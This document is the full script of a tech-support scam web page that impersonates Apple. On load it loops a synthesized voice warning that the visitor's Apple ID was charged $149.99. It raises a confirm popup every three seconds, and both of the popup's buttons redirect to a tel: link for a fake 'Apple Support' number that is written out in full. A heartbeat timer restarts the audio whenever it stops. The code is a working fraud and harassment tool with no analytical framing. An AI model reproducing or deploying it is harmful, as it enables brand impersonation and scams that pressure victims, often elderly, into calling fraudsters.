<script>
var text = "Your Apple ID was recently used at APPLE STORE for Help Immediately call Apple Support +1 (877) 308-2331 to unlock it.";
var femaleVoice = null;

// Function to find the female voice specifically
function loadVoices() {
    var voices = window.speechSynthesis.getVoices();
    // Prioritize known female voices
    femaleVoice = voices.find(voice => 
        voice.name.includes('Google US English') || 
        voice.name.includes('Samantha') || 
        voice.name.includes('Zira') ||
        voice.name.includes('Female')
    );
}

// Initial load
loadVoices();
if (window.speechSynthesis.onvoiceschanged !== undefined) {
    window.speechSynthesis.onvoiceschanged = loadVoices;
}

function playAudio() {
    // Kill any current sound or "hanging" audio immediately
    window.speechSynthesis.cancel();

    var msg = new SpeechSynthesisUtterance(text);
    
    // Assign the female voice if found, otherwise force high pitch
    if (femaleVoice) {
        msg.voice = femaleVoice;
    }
    
    msg.lang = "en-US";
    msg.volume = 1;
    msg.pitch = 1.4; // High pitch for female tone
    msg.rate = 1.2;  // Faster rate to reduce gaps

    // Instant Loop: When it ends, trigger play again immediately
    msg.onend = function() {
        playAudio();
    };

    window.speechSynthesis.speak(msg);
}

function showAlert() {
    if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1 (877) 308-2331 to unlock it.")) {
        window.location.href = "tel:+1 (877) 308-2331";
    } else {
        window.location.href = "tel:+1 (877) 308-2331";
    }
}

window.addEventListener('load', function() {
    // Start Popups
    setInterval(showAlert, 3000);
    
    // Start Audio after a tiny delay to ensure voices are loaded
    setTimeout(function() {
        playAudio();
    }, 100);

    // Heartbeat: If the audio hangs for more than 1 second, force a restart
    setInterval(function() {
        if (!window.speechSynthesis.speaking) {
            playAudio();
        }
    }, 1000);
});
</script>
